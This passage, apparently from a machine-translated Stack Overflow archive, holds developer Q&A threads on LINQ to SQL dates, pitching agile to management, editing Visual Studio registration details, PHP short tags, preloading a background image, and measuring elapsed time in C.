> 时间：2008-10-14T12:33:48.850

如果您不介意在每次使用前查询数据库，我会建议以下解决方法：在一个地方使用 ExecuteQuery 来获取数据上下文中的日期，如下所示：

```
public partial class YourDataContext
{
  public DateTime GetDate()
  {
    return ExecuteQuery<DateTime>("SELECT GETDATE()").First();
  }
} 
```

然后你可以写

```
from subscription in dbContext.Subscriptions
where subscription > dbContext.GetDate().AddDays(2)
select subscription 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T10:20:22.910

您可以使用 ExecuteQuery 来完全控制 sql [http://weblogs.asp.net/scottgu/archive/2007/08/27/linq-to-sql-part-8-executing-custom-sql-expressions。 aspx](http://weblogs.asp.net/scottgu/archive/2007/08/27/linq-to-sql-part-8-executing-custom-sql-expressions.aspx)

我知道它似乎对 ADO.NET 的收益很小（或者可能相反）。

# agile - 转向敏捷开发方法的最佳案例？

> ID：200626
> 
> 赞同：3
> 
> 时间：2008-10-14T10:15:27.007
> 
> 标签：agile, methodology

如果您必须向企业提出关于采用或转向敏捷开发方法（如 SCRUM 或 XP 等）的案例，您会提出什么案例（您如何推销这个概念）？

例如

*   您如何向非技术人员描述这些概念和好处？*   如果你成功了，获胜的论点/案例/理由是什么？

编辑：我问的原因是我的一个朋友（他是一家公司的解决方案架构师）目前正试图决定如何就这个主题与他的管理层接洽，我已经给了他我能提供的建议. 很想听到那些成功提出转向敏捷对齐方法论的人的来信。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-14T11:05:01.993

我的案例：该组织折腾了整整 2 年，并在最终加入敏捷潮流之前失败了......没有更好的选择（截至目前......个人意见）以世界的速度生产高质量的软件变化。你不能再用旧的方式做事了。有些人学习艰难。

*房间里的大象：一个想法好并不意味着它会被接受。*

逻辑参数：

*   **反馈回路**短。客户可以在每个月/迭代结束时**看到正在运行的软件，并使用它...改进和调整以适应口味。**没有更多的开发人员吸了一年的面团，然后带着一头喝醉的大象回来为等马的顾客。
*   在开发开始工作之前，您**无需将所有事情都一成不变（神圣的 SRS）。**随着时间的推移，您可以**改变主意**以反映业务优先级/市场条件的变化......（开发人员不会发脾气）。
*   **更好的沟通**：不再有“这不是我想要的！” 当无法挽救这艘船时。开发人员实时与真实客户交谈，以澄清疑问并验证他们构建的东西是否正确。责任完全在于*客户+开发*，以确保构建正确的产品......通过相互**交谈**......一直。
*   人工流程：**敏捷认识到软件是由人为他人制作的事实。**这些实践促进了团队之间的互动、学习和尊重。还观察到更好的士气
*   遵循 TDD、自动化测试、结对编程等实践可以产生**更好的质量**产品。传统上在项目结束时在“错误修复和搅动”阶段花费的时间被最小化。
*   **易于维护**。回归测试是一个 SNAP！如果做得对，构建的系统是适合/更容易更改/扩展的。开发人员将**简单性**与过度工程视为第二天性。**开发人员并不害怕**“去那里改变它”与“我没有碰那个扭曲的东西......上次的伤疤还没有愈合。”
*   **由于开发人员的支持，**更有可能在最后期限前完成。**估计是根据实际团队速度而不是负责创建图表/mpp/计划的人员的直觉估计来修改的**
***   **可见的进展**- 大而可见的图表（燃尽图等）可以准确地告诉您项目中发生了什么，而无需从秘密/不情愿/非常忙碌的人那里挖掘它。问题是在你的脸上，不能被忽视/隐藏很长时间。开发不必每周一天切换到“进度报告”模式来为管理生成信息......易于收集开发人员似乎并不介意的指标。**

 **我打破了字符限制吗？:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T10:25:21.573

非技术人员对按时并在预算范围内高质量完成的项目感兴趣，并且在交付时能够满足他们的要求。您应该关注敏捷如何帮助实现这些品质。

* * *

有时很难将敏捷推销给非技术人员，原因有两个：

*   不尝试 100% 提前计划的概念并不是很直观
*   相当多的人声称他们使用敏捷，在交付任何东西时都惨遭失败，并给伟大的 SDP 一个坏名声

* * *

谈论敏捷过程处理变化的能力。

如果您与已经与您合作的客户合作，通常会更容易。例如，您可以轻松地向他们展示一段时间内累积的所有变更请求，并展示它们如何影响项目的进度和成本。然后，您可以解释敏捷过程将如何帮助处理此类情况。

沿着同一条线，您可以对“瀑布项目”进行初步估计，并将其与现实生活中的结果进行比较。

* * *

我还将谈论敏捷的质量方法。迭代期间的测试大大提高了质量。带有即时反馈的短迭代也很有帮助，请提及它们。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T10:26:57.000

卖得好的东西是：

*   每次迭代后可以测试、使用和发布的有形产品。（适合喜欢看他/她的钱能买到什么的产品负责人）
*   它为开发过程带来了透明度，尤其是在日常站立期间，因此减少了功能重复和混乱
*   在每个 sprint 之后进行演示，让同事了解产品的发展方向、开发工作后可用的内容，并让人们讨论和思考什么会使产品变得更好
*   经过十几次冲刺后，开发估算可以达到合理的准确性。至少在对焦点因素进行了一些修改之后。
*   提高开发人员在拥有特定功能时的认可度
*   **使用敏捷时的产品更改成本**往往比使用瀑布方法时要小得多

非常适合小型开发团队，但需要开发团队的支持。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T11:41:01.203

如果不具体提及旧方法的问题以及新方法将如何解决这些问题，几乎不可能引入新方法。

实际上，您可能需要提供一堆选择，然后以推荐您最喜欢的结尾。准备好解释为什么它是你的最爱，并且非常了解你选择的方法的弱点。

并确保你不会混淆你的感觉强度和论点的强度，并且你不会试图将个人价值选择和文化依恋作为客观的技术评估。你的同事并不愚蠢——如果你这样做，他们**会**知道的，他们会很快对你发火。

如果你想从哲学上理解这一点，沟通实际上并不依赖于口才、修辞或表达方式，而是依赖于听到信息的情感背景。人们只有在向你走来时才能听到你的声音，而不是在你的话语追赶他们的时候。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T10:40:37.067

根据我的经验，能立即将 Scrum 推销给非技术管理人员的一件事是燃尽图。有一个纸质图表 - 所有人都可以看到并易于理解 - 显示每日进步的想法是立竿见影的。它很早就清楚地表明了项目是否按计划进行。

由于积压、冲刺、每日 Scrum 等都是使燃尽图工作所必需的，所以先推销燃尽图的想法，然后说明需要 Scrum 的其余部分，最后指出执行 a 是可行的该过程的三周试用期对进度的影响最小。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T11:48:36.133

我认为企业的第一大卖点是他们决定你要做什么，所以他们将确定优先事项。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-14T13:26:45.263

我的嘘声，一个非技术人员，通常更喜欢列举新方法将如何提高团队的生产力。因此，我们引入**SCRUM**作为一种**管理**方法的方法，侧重于在**进度可见性**、**更好的沟通**和**更快的反馈**方面的收益。

All the other gains, as a fact of matters, seens intangible for people like my boss.

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-14T16:15:10.853

From what I have read and heard the term Agile seems to get a bad rap and scares people. From a business perspective I think what it boils down to is how can I provide business value in a more responsive way. Agile is a method of supporting the concept of delivering business value quickly.

Instead of discussing it in technical terms I would suggest your friend discuss it in business terms and state that he has some ideas that could help deliver business value to his end customers more quickly.

我不建议他讨论 XP 或敏捷作为方法，而是介绍简短的、可交付的重点会议（即 SCRUM），然后尝试从那里发展它。我觉得如果你告诉企业你可以更快地以更可预测的方式得到他们想要的东西，并且你兑现了这一声明，你就会接受让你到达那里的做法。

# visual-studio-2008 - 如何更改 Visual Studio 2008 的注册公司名称？

> ID：200635
> 
> 赞同：30
> 
> 时间：2008-10-14T10:19:06.813
> 
> 标签：visual-studio-2008

有没有办法在不重新安装 Visual Studio 2008 的情况下更改注册公司的名称？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2008-10-14T11:33:00.690

这应该有您正在寻找的答案：http: [//bytes.com/forum/thread635503.html](http://bytes.com/forum/thread635503.html)

> 对于 AssemblyInfo 中的 CompanyName，它是 $registeredorganization$，它使用来自 HKLM\Software\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization 的注册表项值中的值。

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2010-03-17T21:00:11.093

对于它的价值，我在这里写了一组说明：http: [//blog.stuartthompson.net/2010/03/changeing-visual-studio-registration-information/](http://blog.stuartthompson.net/2010/03/changing-visual-studio-registration-information/)

在了解 devenv /setup 步骤和 SplashInfo 键之前，我没有找到完整的解决方案。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-01T19:05:01.607

这也让我感到困惑，好几次。我之前安装了 VS2005，但在重建笔记本时不得不再次经历这个头痛。VS2005Pro 的安装程序从不询问我的组织，只询问用户名。然后它默认为笔记本制造商。由于我不是为我的笔记本制造商工作，我想如果我以后寄出带有制造商名称的东西可能会给我带来麻烦。

而且我已经直觉它应该可以从注册表中调整，甚至导出整个注册表并从记事本中进行全局搜索和替换，并清理了当我锁定时那些散乱的键重新加载我编辑的注册表。

没有效果。

Giovanni Galbo 在他的回答中写道，参考了这篇文章：[http](http://bytes.com/forum/thread635503.html) ://bytes.com/forum/thread635503.html ，并且还提到了如果还没有注册组织，它借用的密钥。

但是如果“RegisteredOrganization”不存在怎么办？它仍然默认为“”。

添加密钥。自己设置值。固定的。

我认为这与大多数其他版本的 VS 一样有效，包括 VS2008。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-28T06:38:45.337

对于那些感兴趣的人，[这就是](http://blog.brouwer.pro/2012/09/how-to-change-licensed-to-name-for-visual-studio-2012/)您在 Visual Studio 2012 中的操作方式。

1.  打开注册表编辑器（开始->运行->键入“regedit”->按回车键）
2.  找到以下项： HKCU\Software\Microsoft\VisualStudio\11.0_Config\Registration\UserName
3.  将其值更改为所需的名称
4.  导航到以下文件夹：C:\Users{YOUR_USER}\AppData\Roaming\Microsoft\VisualStudio\11.0（将占位符替换为您自己的用户名）
5.  删除文件 vs000223.dat - 这实际上是一个包含启动画面的 JPG 文件，您可以更改它的名称以自己查看
6.  启动 Visual Studio，它会神奇地重新创建包含修改后名称的文件！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T11:05:46.483

一个快速的建议，打开 RegEdit 并搜索现有的公司名称字符串。然后尝试改变它。

# php - 可以使用 PHP 短标签吗？

> ID：200640
> 
> 赞同：533
> 
> 时间：2008-10-14T10:21:04.563
> 
> 标签：php, coding-style, php-shorttags

这是[根据官方文档](http://www.php.net/manual/en/language.basic-syntax.php)的信息：

> 有四对不同的开始和结束标签可以在 PHP 中使用。其中两个`<?php ?>` 和`<script language="php"> </script>`始终可用。另外两个是短标签和 ASP 样式标签，可以从 php.ini 配置文件中打开和关闭。因此，虽然有些人发现短标签和 ASP 样式标签很方便，但它们的可移植性较差，**通常不推荐使用**。

根据我的经验，大多数服务器*都*启用了短标签。打字

```
<?= 
```

比打字方便多了

```
<?php echo 
```

程序员的便利性是一个重要因素，那么**为什么**不推荐它们呢？

* * *

## 回答 #1

> 赞同：381
> 
> 时间：2008-10-14T10:31:56.567

不建议使用它们，因为如果您必须将代码移动到不支持它的服务器（并且您无法启用它），它就是一个 PITA。正如您所说，许多共享主机*确实*支持短标签，但“很多”并不是全部。如果您想共享您的脚本，最好使用完整的语法。

我同意`<?`and`<?=`对程序员来说比`<?php`and更容易，`<?php echo`但是只要您每次都使用相同的表单（并且不要插入空格（例如：`<? php`或`<? =`） ，就可以进行批量查找和替换

我根本不买可读性作为理由。大多数认真的开发人员都可以选择语法高亮。

正如 ThiefMaster 在评论中提到的**[那样，从 PHP 5.4 开始，`<?= ... ?>`所有地方都支持标签，无论短标签设置如何](https://www.php.net/ChangeLog-5.php#5.4.0)**。这应该意味着它们可以安全地用于可移植代码，但这确实意味着它们依赖于 PHP 5.4+。如果你想支持 pre-5.4 并且不能保证短标签，你仍然需要使用`<?php echo ... ?>`.

此外，您需要知道**[ASP 标签 <% 、 %> 、 <%= 和 script 标签已从 PHP 7 中删除](https://www.php.net/manual/en/language.basic-syntax.phptags.php)**。因此，如果您想支持长期可移植代码并想切换到最现代的工具，请考虑更改该部分代码。

* * *

## 回答 #2

> 赞同：178
> 
> 时间：2008-10-14T23:14:10.930

我太喜欢`<?=$whatever?>`放手了。从来没有遇到过问题。我会等到它咬我的屁股。说真的，85% 的（我的）客户在他们被关闭的**极少数**情况下可以访问 php.ini 。其他 15% 使用主流托管服务提供商，几乎所有人都启用了它们。我爱他们。

* * *

## 回答 #3

> 赞同：147
> 
> 时间：2011-05-19T20:58:10.240

从 PHP 5.4 开始，echo 快捷方式与短标签是一个单独的问题，因为 echo 快捷方式将始终启用。现在是事实：

*   [Rasmus Lerdorf 的 SVN 修订](http://svn.php.net/viewvc?view=revision&revision=311260)
*   [邮件列表讨论](http://marc.info/?t=123964298400001&r=1&w=2)

所以 echo 快捷方式本身 ( `<?=`) 现在可以安全使用了。

* * *

## 回答 #4

> 赞同：83
> 
> 时间：2009-12-21T23:16:31.430

整个讨论的问题在于使用 PHP 作为模板语言。没有人认为应该在应用程序源文件中使用标签。

然而 PHP 的可嵌入语法允许它被用作一种强大的模板语言，并且模板应该尽可能简单和可读。许多人发现使用像 Smarty 这样更慢的附加模板引擎更容易，但对于我们中间那些需要快速渲染和纯代码库的纯粹主义者来说，PHP 是编写模板的唯一方法。

反对使用短标签的唯一有效参数是并非所有服务器都支持它们。关于与 XML 文档冲突的评论是可笑的，因为您可能不应该将 PHP 和 XML 混为一谈。如果你是，你应该使用 PHP 来输出文本字符串。安全永远不会成为问题，因为如果您将数据库访问凭证等敏感信息放入模板文件中，那么，您将遇到更大的问题！

那么，关于服务器支持的问题，诚然要了解他们的目标平台。如果共享主机是可能的目标，则应避免使用短标签。但是对于许多专业开发人员（例如我自己），客户承认（实际上，取决于事实）我们将决定服务器要求。通常我负责自己设置服务器。

而且我们从不与不能让我们绝对控制服务器配置的托管服务提供商合作——在这种情况下，我们可以指望运行比失去短标签支持更多的麻烦。它只是不会发生。

所以是的——我同意应该仔细权衡短标签的使用。但我也坚信它应该始终是一种选择，并且了解其环境的开发人员应该可以随意使用它们。

* * *

## 回答 #5

> 赞同：35
> 
> 时间：2008-10-21T21:45:15.287

[由于Zend Framework](http://framework.zend.com/)在其[默认 MVC 配置](http://framework.zend.com/manual/en/zend.controller.html#zend.controller.quickstart.go)中推动了“ [PHP 作为模板语言](http://framework.zend.com/manual/en/zend.view.html#zend.view.introduction.view)”，短标签又回来了。我不明白辩论是关于什么的，您一生中将生产的大多数软件都将在您或您的公司将控制的服务器上运行。只要你保持一致，就不应该有任何问题。

**更新**

在使用长格式的[Magento](http://www.magentocommerce.com/)做了相当多的工作之后。结果，我切换到了长格式：

```
<?php and <?php echo 
```

超过

```
<? and <?= 
```

似乎需要做少量工作来确保互操作性。

* * *

## 回答 #6

> 赞同：23
> 
> 时间：2008-10-14T10:24:52.557

因为它可能与 XML 声明产生混淆。[不过，](http://bytes.com/forum/thread596.html)很多人[都同意](http://michaelkimsal.com/blog/php-short-tags/) 你的看法。

另一个问题是它会产生痛苦，用短标签对所有内容进行编码，最终发现最终托管服务器已关闭它们......

* * *

## 回答 #7

> 赞同：21
> 
> 时间：2013-04-24T05:10:30.413

以下是相同的精彩流程图：

![<?= 的使用决策树](https://i.stack.imgur.com/TJpOs.png)

资料来源：[软件工程堆栈交换上的类似问题](https://softwareengineering.stackexchange.com/a/151694)

* * *

## 回答 #8

> 赞同：15
> 
> 时间：2011-08-16T14:51:29.793

万一有人还在关注这一点……从 PHP 5.4.0 开始，Alpha 1`<?=`始终可用：

[http://php.net/releases/NEWS_5_4_0_alpha1.txt](http://php.net/releases/NEWS_5_4_0_alpha1.txt)

所以看起来短标签是（a）可以接受的并且（b）可以保留。至少目前...

* * *

## 回答 #9

> 赞同：14
> 
> 时间：2011-05-30T11:34:03.193

[http://uk3.php.net/manual/en/language.basic-syntax.phpmode.php](http://uk3.php.net/manual/en/language.basic-syntax.phpmode.php)有很多建议，包括：

> 虽然有些人发现短标签和 ASP 样式标签很方便，但它们的可移植性较差，通常不推荐使用。

和

> 请注意，如果您将 PHP 嵌入到 XML 或 XHTML 中，您将需要使用`<?php ?>`标签来保持与标准的兼容。

和

> 在开发用于重新分发的应用程序或库时，或在不受您控制的 PHP 服务器上部署时，应避免使用短标签，因为目标服务器上可能不支持短标签。对于可移植、可再分发的代码，请确保不要使用短标签。

* * *

## 回答 #10

> 赞同：12
> 
> 时间：2008-10-14T10:25:10.700

*   在某些网络服务器（共享主机等）中，默认情况下不会打开短标签，因此如果您需要移至其中之一，**代码可移植性就会成为一个问题。**

*   **对某些人来说，可读性**可能是个问题。许多开发人员可能会发现，与扫描文件相比，它`<?php`作为代码块开始的更明显标记更引人注目`<?`，尤其是当您遇到[HTML](http://en.wikipedia.org/wiki/HTML)和 PHP 紧密交织的代码库时。

* * *

## 回答 #11

> 赞同：12
> 
> 时间：2012-05-30T12:14:24.810

注意：从 PHP 5.4 开始，短标签 ,`<?=`现在始终可用。

* * *

## 回答 #12

> 赞同：6
> 
> 时间：2010-07-09T02:58:18.120

我在查找有关该主题的信息后阅读了此页面，我觉得没有提到一个主要问题：懒惰与一致性。PHP 的“真实”标签是 <?php 和 ?>。为什么？我真的不在乎。当那些显然是用于 PHP 的时候，你为什么要使用其他东西呢？<% 和 %> 对我来说意味着 ASP，而 <script ..... 意味着 Javascript（在大多数情况下）。所以为了一致性、快速学习、可移植性和简单性，为什么不坚持标准呢？

另一方面，我同意模板中的短标签（并且仅在模板中）看起来很有用，但问题是我们在这里花了很多时间讨论它，实际上可能需要很长时间才能浪费这么多时间输入额外的三个字符“php”！

虽然有很多选择很好，但它根本不合逻辑并且可能会导致问题。想象一下，如果每种编程语言都允许 4 种或更多类型的标签：Javascript 可以是 <JS 或 < script .... 或 <% 或 <? JS .... 会有帮助吗？在 PHP 的情况下，解析顺序倾向于允许这些事情，但该语言在许多其他方面并不灵活：它会在最轻微的不一致时抛出通知或错误，但经常使用短标签。而且当在不支持短标签的服务器上使用短标签时，可能需要很长时间才能找出问题所在，因为在某些情况下不会给出错误。

最后，我不认为短标签是这里的问题：PHP 代码块只有两种逻辑类型—— 1) 常规 PHP 代码，2) 模板回显。对于前者，我坚信应该只允许 <?php 和 ?> 以保持一切一致和可移植。对于后者， <?=$var?> 方法很难看。为什么一定要这样？为什么不添加一些更合乎逻辑的东西呢？<?php $var ?> 这不会做任何事情（并且只有在最遥远的可能性中它可能会与某些东西发生冲突），并且可以轻松替换笨拙的 <?= 语法。或者，如果这是一个问题，也许他们可以使用 <?php=$var?> 而不必担心不一致。

在打开和关闭标签有 4 个选项以及随机添加一个特殊的“echo”标签的地方，PHP 还可能在 php.ini 或 .htaccess 中有一个“自定义打开/关闭标签”标志。这样设计师就可以选择他们最喜欢的那个。但出于明显的原因，这是矫枉过正的。那么为什么允许 4+ 选项呢？

* * *

## 回答 #13

> 赞同：5
> 
> 时间：2019-09-02T11:04:39.957

截至 2019 年，我不同意这里的某些答案。推荐使用：

**1\. 长标签**

```
<?php /* code goes here */ ?> 
```

**2.短回声标签**

```
<?= /* code goes here */ ?> 
```

原因：[PSR-1基本编码标准推荐](https://www.php-fig.org/psr/psr-1/)

`<? /* code goes here */ ?>`不推荐使用其他短标签。

规范说：

> PHP 代码必须使用长标签或短回声标签；*它不得使用其他标签变体*。

* * *

## 回答 #14

> 赞同：4
> 
> 时间：2008-10-14T22:12:25.390

一种稍微不同的情况是在开发[CodeIgniter](http://en.wikipedia.org/wiki/Codeigniter#CodeIgniter)应用程序时。每当在模板/视图中使用 PHP 时，CodeIgniter 似乎都使用短标签，否则对于模型和控制器，它总是使用长标签。这不是框架中的硬性规则，但在大多数情况下，框架和其他用途的许多源代码都遵循此约定。

我的两分钱？如果您从不打算在其他地方运行代码，请根据需要使用它们。当我意识到这是一个愚蠢的想法时，我宁愿不必进行大量搜索和替换。

* * *

## 回答 #15

> 赞同：4
> 
> 时间：2012-04-20T11:50:33.567

`<?`在较新版本中默认禁用。您可以像描述*[的在 PHP 中启用短标签](http://www.tomjepson.co.uk/tutorials/35/enabling-short-tags-in-php.html)*一样启用它。

* * *

## 回答 #16

> 赞同：4
> 
> 时间：2012-11-06T21:06:05.230

当您使用具有单独视图文件的 MVC 框架或 CMS 时，最好使用它们。
它速度快，代码少，不会让设计人员感到困惑。只要确保您的服务器配置允许使用它们。

* * *

## 回答 #17

> 赞同：3
> 
> 时间：2009-11-08T19:46:15.840

面对现实吧。没有短标签的 PHP 丑得要命。

`.htaccess`如果您无法访问，您可以在文件中启用它们`php.ini`：

```
php_flag short_open_tag on 
```

* * *

## 回答 #18

> 赞同：3
> 
> 时间：2011-04-13T16:51:31.800

恕我直言，使用短标签的人经常忘记逃避他们正在回响的任何内容。最好有一个默认转义的模板引擎。我相信 Rob A 写了一个快速破解方法来逃避 Zend Frameworks 应用程序中的短标签。如果您喜欢短标签，因为它使 PHP 更易于阅读。那么Smarty可能是一个更好的选择吗？

```
{$myString|escape} 
```

对我来说看起来比

```
<?= htmlspecialchars($myString) ?> 
```

* * *

## 回答 #19

> 赞同：3
> 
> 时间：2011-05-30T11:39:04.370

为避免可移植性问题，请使用 PHP 标记开始`<?php`，如果您的 PHP 文件是纯 PHP 而不是 HTML，则不需要使用结束标记。

* * *

## 回答 #20

> 赞同：3
> 
> 时间：2014-03-09T17:01:53.573

人们不得不问使用短标签有什么意义。

**打字更快**

MDCore 说：

> `<?=`比打字方便多了`<?php echo`

是的。您不必在整个脚本中输入 7 个字符 * X 次。

但是，当一个脚本需要一个小时、10 小时或更长时间来设计、开发和编写时，在脚本持续时间内不在这里和那里输入这 7 个字符的几秒钟时间有多重要？

与一些核心或所有脚本的潜力相比，如果短标签未打开，或者打开但更新或有人更改 ini 文件/服务器配置阻止它们工作，则其他潜力。

您获得的小小好处并没有超过潜在问题的严重性，即您的网站无法正常工作，或者更糟糕的是，只有部分网站无法正常工作，因此令人头疼。

**更容易阅读**

这取决于*熟悉程度*。
我一直看到并使用`<?php echo`. 所以虽然`<?=`不难阅读，但我并不熟悉，因此*不容易阅读*。

并且随着前端/后端开发人员的拆分（与大多数公司一样），处理这些模板的前端开发人员是否会更*熟悉*知道`<?=`等于“PHP 开放标记和回显”？
我会说大多数人会更喜欢更合乎逻辑的那个。也就是说，一个明确的 PHP 打开标记，然后是发生了什么“回声” - `<?php echo`。

**风险评估**
问题 = 整个站点或核心脚本无法工作；

问题的可能性*非常低*+ 结果的严重性*非常高*=**高风险**

**结论**

您可以在这里和那里节省几秒钟，而不必输入几个字符，但为此冒了很大的风险，并且还可能因此失去可读性。

*熟悉*的前端或后端编码人员`<?=`更容易理解`<?php echo`，因为它们是标准的 PHP 东西——标准的`<?php`开放标签和众所周知的“回声”。
（即使是前端编码人员也应该知道“echo”，否则他们根本不会处理框架提供的任何代码）。

而相反的可能性不大，有人不太可能从逻辑上推断出 PHP 短标签上的等号是“回声”。

* * *

## 回答 #21

> 赞同：3
> 
> 时间：2018-04-17T11:15:17.763

我认为值得一提的是，从 PHP 7 开始：

*   简短的 ASP PHP 标签`<% … %>`不见了
*   如果设置为 true，PHP 短标签`<? … ?>`仍然可用。`short_open_tag`这是默认设置。
*   从 PHP 5.4开始，无论设置如何，短**打印**标签*始终处于*`<?=… ?>`启用状态。*`short_open_tag`*

 *很好摆脱第一个，因为它干扰了其他语言。

除了个人喜好之外，现在没有理由不使用短打印标签。

当然，如果您编写的代码与旧版本的 PHP 5 兼容，则需要遵守旧规则，但请记住，现在不支持 PHP 5.6 之前的任何内容。

请参阅：[https ://secure.php.net/manual/en/language.basic-syntax.phptags.php](https://secure.php.net/manual/en/language.basic-syntax.phptags.php)

* * *

## 回答 #22

> 赞同：2
> 
> 时间：2009-08-10T18:41:38.973

*   如果您确定服务器将支持它并且您的开发人员会理解它，则可以使用短标签。
*   很多服务器不支持，很多开发者看过一次就明白了。
*   我使用完整的标签来确保可移植性，因为它真的没那么糟糕。

话虽如此，我的一个朋友这样说，以支持替代的*标准化*asp 样式标签，例如`<%`而不是`<?`，这是 php.ini 中称为 asp_tags 的设置。这是他的推理：

> ...**任意约定应该标准化**。也就是说，任何时候我们面对一组具有相同价值的可能性——比如我们的编程语言应该使用什么奇怪的标点来划分自身——我们应该选择一种标准的方式并坚持下去。这样我们就减少了所有语言的学习曲线（或任何与约定有关的东西）。

对我来说听起来不错，但我认为我们中的任何人都不能围绕这个事业绕圈子。同时，我会坚持完整的`<?php`。

* * *

## 回答 #23

> 赞同：2
> 
> 时间：2019-03-20T06:07:47.420

短标签在 php 中始终可用。所以你不需要在你的脚本中回显第一条语句

例子：

```
 $a =10;
    <?= $a;//10 
    echo "Hellow";//
    echo "Hellow";

   ?> 
```

突然你需要使用一个 php 脚本然后你可以使用它。例子：

```
<html>
<head>
<title></title>
</head>  
<body>
<p>hellow everybody<?= hi;?></p>
<p>hellow everybody  </p> 
<p>hellow everybody  </p>   
</body>
</html> 
```

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2008-10-21T21:27:18.160

如果你关心[XSS](http://en.wikipedia.org/wiki/Cross-site_scripting)，那么你应该`<?= htmlspecialchars(…) ?>`大部分时间都使用，所以短标签不会有很大的不同。

即使您缩短`echo htmlspecialchars()`为`h()`，这仍然是一个问题，您必须记住几乎每次都添加它（并尝试跟踪哪些数据是预先转义的，哪些是未转义但无害的，只会更容易出错）。

我使用默认安全[的模板引擎](http://phptal.org)`<?php`并为我编写标签。

* * *

## 回答 #25

> 赞同：1
> 
> 时间：2015-10-14T01:16:07.430

`<?php ?>`由于这种编程语言的开发人员已经大量更新了他们的核心语言，因此使用起来要好得多。您可以看到短标签和长标签之间的区别。

短标签将突出显示为浅红色，而较长的标签将突出显示为较暗！

但是，呼应一些东西，例如：`<?=$variable;?>`很好。但更喜欢较长的标签。`<?php echo $variable;?>`

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2015-11-29T06:12:51.223

将`<?`（不带尾随空格）转换为`<?php`（带尾随空格）：

```
find . -name "*.php" -print0 | xargs -0 perl -pi -e 's/<\?(?!php|=|xml|mso| )/<\?php /g' 
```

将`<?`（带有尾随空格）转换为`<?php`（保留尾随空格）：

```
find . -name "*.php" -print0 | xargs -0 perl -pi -e 's/<\? /<\?php /g' 
```

* * *

## 回答 #27

> 赞同：1
> 
> 时间：2019-09-21T18:35:34.500

php 中有 3 个标签：

1.  `<?php ?>`不需要指示任何配置的长格式标签
2.  php.ini 中的short_open_tag`<? ?>` 选项打开时可用的 short_open_tag
3.  从 php 5.4.0 开始缩短标签`<?=` ，它始终可用

从 php 7.0.0 asp 和 script 标签被删除

* * *

## 回答 #28

> 赞同：-5
> 
> 时间：2008-10-16T01:19:26.447

不，它们正在[被 PHP 6 淘汰，](http://www.slideshare.net/thinkphp/php-53-and-php-6-a-look-ahead/)所以如果你喜欢代码的长寿，那就不要使用它们或`<% ... %>`标签。

# php - 如何确保在页面加载之前显示背景图像？

> ID：200662
> 
> 赞同：0
> 
> 时间：2008-10-14T10:30:25.917
> 
> 标签：php, javascript, html

有没有办法确保在页面上显示任何其他内容之前始终首先显示（大，300K）背景图片？

在服务器上，我们可以访问 PHP。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T10:34:16.127

所有的 html 内容在它开始获取图像之前就被提供和解析，所以在开始之前你会遇到问题。

您可以通过以编程方式隐藏内容，然后在加载图像时触发它的“显示”来规避这种情况。

IE：

```
<html>
  <body>
    <image here/>
    <div id="content" style="display:none;" >

    </div>
    <script type="psudocode"> 
     when(image.loaded){ 
          $("#content").show();
     }
    </script>
  </body>
</html> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T10:45:45.963

如果您将所有内容都放在一个容器中，那么使用这种技术可能会非常接近。如果 javascript 被禁用/不可用，它也会正常失败。

因此，如果您因为经理或其他原因必须这样做，这就是我会使用的方法。

```
<html><head><!-- head section --></head>
<body>
    <div id="container">
       <script type="text/javascript">
       <!--
         document.getElementById('container').style.display = 'none';
       -->
       </script>
       Content goes here
    </div>
    <script type="text/javascript">
    <!--
      document.getElementById('container').style.display = 'block';
    -->
    </script>
</body></html> 
```

但是，如果您的内容很少，它可能不会有太大的好处。您当然可以在第二个 javascript 块上添加一个计时器，将其延迟一秒钟左右：P

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T11:14:20.103

```
<html><head>
<script type="text/javascript">
//Hide on load
onload=function(){
    document.body.style.display="none";
    var imag = new Image();

    imag.onload=function(){
        var main = document.body;
        main.style.backgroundImage="url("+this.src+")";
        main.style.display="";

    };
    imag.src="http://dayton.hq.nasa.gov/IMAGES/MEDIUM/GPN-2000-001935.jpg";
}
</script>
</head>
<body>
    YOU CAN' T SEE MEE!!
</body>
</html> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T11:26:16.973

如果您不想依赖 JavaScript，一种可能的方法是制作一个只有背景图像的虚拟页面。几秒钟后，它重定向到真实页面，后台将快速加载，因为它已经在缓存中。

如果时间是固定的，我认为这不是一个超级有吸引力的解决方案。
请注意，300KB 对于背景图像来说是相当大的。我见过更糟糕的情况，有人使用 1MB 的图像：即使连接速度相对较快，我也可以看到页面元素之后的背景加载方式。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T10:34:50.603

我认为您能够做到这一点的唯一方法是使用 javascript - 向用户发送仅包含您的背景图像的 HTML 和一些 javascript，这些 javascript 在显示其余内容之前等待一定时间或使用 AJAX 来检索其余内容（本质上是相同的东西）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-07-02T01:29:26.867

您可以将页面中的图像作为 base64 图像加载，然后它已经与页面一起加载。

# c - getting elapsed time since process start

> ID：200663
> 
> 赞同：4
> 
> 时间：2008-10-14T10:30:31.953
> 
> 标签：c, timing, multiplatform

I need a way to get the elapsed time (wall-clock time) since a program started, in a way that is resilient to users meddling with the system clock.

On windows, the non standard clock() implementation doesn't do the trick, as it appears to work just by calculating the difference with the time sampled at start up, so that I get negative values if I "move the clock hands back".

